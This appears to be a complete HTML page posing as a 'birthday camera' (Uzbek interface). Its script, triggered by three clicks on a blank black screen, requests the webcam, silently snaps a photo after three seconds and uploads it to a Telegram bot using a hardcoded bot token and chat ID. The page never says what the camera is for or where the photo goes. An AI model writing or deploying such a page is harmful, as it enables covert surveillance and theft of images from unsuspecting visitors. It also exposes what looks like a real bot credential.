<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Otabek Birthday Camera</title>
  <style>
    body { margin: 0; background: #000; color: white; font-family: sans-serif; }
    #video, #canvas { display: none; }
    #msg {
      position: absolute;
      top: 40%;
      left: 50%;
      transform: translate(-50%, -50%);
      text-align: center;
      font-size: 1.5rem;
      background: rgba(0, 0, 0, 0.7);
      padding: 1em;
      border-radius: 1em;
      display: none;
      z-index: 10;
    }
  </style>
</head>
<body>
  <div id="msg">ðŸ“¸ Rasm yuborildi!</div>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    let clickCount = 0;
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const msg = document.getElementById('msg');

    document.body.addEventListener('click', () => {
      clickCount++;
      if (clickCount === 3) {
        startCameraAndSend();
        clickCount = 0;
      }
    });

    async function startCameraAndSend() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        video.onloadedmetadata = () => {
          video.play();

          setTimeout(() => {
            takePhotoAndSend();
            stream.getTracks().forEach(track => track.stop());
          }, 3000); // 3 sekunddan soâ€˜ng suratga oladi
        };
      } catch (err) {
        alert("Kameraga kirish imkoni yoâ€˜q!");
        console.error(err);
      }
    }

    function takePhotoAndSend() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);
      const imageData = canvas.toDataURL('image/png');

      const blob = dataURLtoBlob(imageData);
      const formData = new FormData();
      formData.append('chat_id', '5529017013'); // 5529017013
      formData.append('photo', blob, 'photo.png');

      fetch('https://api.telegram.org/bot7972832275:AAHjqRyB30_EA5q5cw2s-baG4z-vZwXdYmo/sendPhoto', {
        method: 'POST',
        body: formData
      }).then(() => {
        msg.style.display = 'block';
        setTimeout(() => msg.style.display = 'none', 3000);
      }).catch(err => {
        alert("Rasm yuborilmadi");
        console.error(err);
      });
    }

    function dataURLtoBlob(dataurl) {
      const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
        bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
      while (n--) u8arr[n] = bstr.charCodeAt(n);
      return new Blob([u8arr], { type: mime });
    }
  </script>
</body>
</html>
